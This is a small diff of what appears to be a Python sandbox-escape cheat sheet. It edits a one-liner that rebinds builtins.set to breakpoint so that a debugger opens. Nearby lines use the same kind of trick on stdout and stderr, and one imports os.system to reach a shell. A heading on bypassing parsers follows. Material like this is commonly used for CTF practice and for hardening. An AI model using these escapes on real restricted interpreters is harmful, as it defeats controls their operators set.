@@ -184,7 +184,7 @@ from os import system as __getattr__; from __main__ import sh
 # if builtins aren't deleted
 import sys;sys.stderr.flush=breakpoint
 import sys;sys.stdout.flush=breakpoint
-import pdb,builtins;builtins.set = breakpoint;a
+import pdb,builtins as e;e.set=breakpoint;a
 
 ```
 ### Bypass parsers using comments and encodings
